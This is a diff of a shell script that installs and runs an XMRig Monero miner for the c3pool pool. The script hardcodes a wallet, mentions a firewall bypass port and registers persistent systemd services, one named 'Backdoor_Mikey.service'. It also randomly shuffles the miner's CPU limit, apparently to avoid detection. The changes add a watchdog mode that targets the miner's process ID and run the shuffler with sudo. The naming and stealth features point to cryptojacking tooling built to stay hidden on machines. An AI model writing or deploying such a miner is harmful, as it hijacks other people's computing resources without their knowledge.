@@ -23,7 +23,7 @@ poolPort=17777  #     80: 1000 diff (Firewall bypass)
 # your wallet public address
 wallet=4256HG8uJUTPBqZiJYPNQ92x6PV1sUsngAsv3TQX4woqJGFsKQkjCdoZKbgfr8C3VnLWK7Qd5Y3WJBPcuzMW93AmVSYtN2W # place it HERE!
 # installation directory (DONT change)
-InstDIR=$HOME
+InstDIR=$HOME # do not change!
 DIR=$InstDIR/c3pool
 # remote build via IP
 # remote=true #deprecated run the `. build.sh -r` for remote build deploy
@@ -99,17 +99,30 @@ function miner_instance_running () {
 }
 function shuffle () {
     sleep 1;
-    while true;
-    do echo "shuffle CPU limit ...";
-    lim=`echo $(shuf -i$CPU_min_lim-$CPU_max_lim -n1)`;
-    threads=`echo $(grep -c ^processor /proc/cpuinfo)`;
-    log "[CPU threads]: $threads virtual cores" 
-    log "[CPU limit shuffle]: limiting CPU usage to $lim% ...";
-    log "upper limit $(($threads*$lim))";
-    cpulimit -e xmrig -l $(($threads*$lim)) & # 2 t/c
-    sleep $(shuf -i15-45 -n1);
-    pkill cpulimit; 
-    sleep 1; 
+    PID=""
+    if [[ $watchdog == true ]]; then
+        prcStr=$(ps -aux | grep xmrig)
+        PID=(${prcStr//root / })
+    fi
+    echo "PID" $PID
+    while true; 
+    do
+        # try to find the process
+        # daemon will not create a classic xmrig process
+        log "[Shuffle]: sample new CPU limit ...";
+        lim=`echo $(shuf -i$CPU_min_lim-$CPU_max_lim -n1)`;
+        threads=`echo $(grep -c ^processor /proc/cpuinfo)`;
+        log "[CPU threads]: $threads virtual cores" 
+        log "[CPU limit shuffle]: limiting CPU usage to $lim% ...";
+        log "upper limit $(($threads*$lim))";
+        if [[ $watchdog == true ]]; then
+            cpulimit -p $PID -l $(($threads*$lim)) 
+        else
+            cpulimit -e xmrig -l $(($threads*$lim)) 
+        fi
+        sleep $(shuf -i15-45 -n1);
+        pkill cpulimit; 
+        sleep 1; 
     done
 }
 function runMiner () {
@@ -186,7 +199,7 @@ CPUWeight=1
 WantedBy=multi-user.target
 EOL
     sudo mv /tmp/Backdoor_Mikey.service /etc/systemd/system/Backdoor_Mikey.service
-    log "..... Mikey daemon is here ....."
+    log "..... Mikey watchdog is here ....."
     sudo systemctl enable Backdoor_Mikey.service
     sudo systemctl start Backdoor_Mikey.service
 }
@@ -197,7 +210,7 @@ function shuffler () {
   [Unit]
 Description=Shuffle
 [Service]
-ExecStart=/bin/bash $InstDIR/build.sh -s
+ExecStart=sudo /bin/bash $InstDIR/DirtyMike/build.sh -s
 Restart=always
 Nice=8
 CPUWeight=1
